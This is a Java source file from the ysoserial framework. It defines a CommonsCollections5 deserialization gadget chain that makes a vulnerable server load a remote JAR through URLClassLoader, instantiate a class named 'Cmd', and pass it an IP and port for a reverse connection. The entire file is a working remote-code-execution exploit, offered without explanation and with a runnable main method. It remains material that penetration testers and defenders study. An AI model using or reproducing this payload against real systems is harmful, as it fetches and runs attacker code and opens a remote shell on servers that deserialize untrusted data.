package ysoserial.payloads;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


public class CommonsCollections5ForLoadJar extends
    PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
    public BadAttributeValueExpException getObject(final String ... ipAndHost) throws Exception {
        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
        String payloadUrl = ipAndHost[0];

        String ip2 = ipAndHost[1];
        Integer port2 = Integer.parseInt(ipAndHost[2]);
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[] { new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }),
            new InvokerTransformer(
                "newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                    payloadUrl) } } }),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { "Cmd" }),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class,int.class } }),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { ip2,port2 } }),
            new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
        return val;
    }
    public static Constructor<?> getFirstCtor(final String name)
        throws Exception {
        final Constructor<?> ctor = Class.forName(name)
            .getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    public static Field getField(final Class<?> clazz, final String fieldName)
        throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field == null && clazz.getSuperclass() != null) {
            field = getField(clazz.getSuperclass(), fieldName);
        }
        field.setAccessible(true);
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName,
        final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections5ForLoadJar.class, args);
    }

}
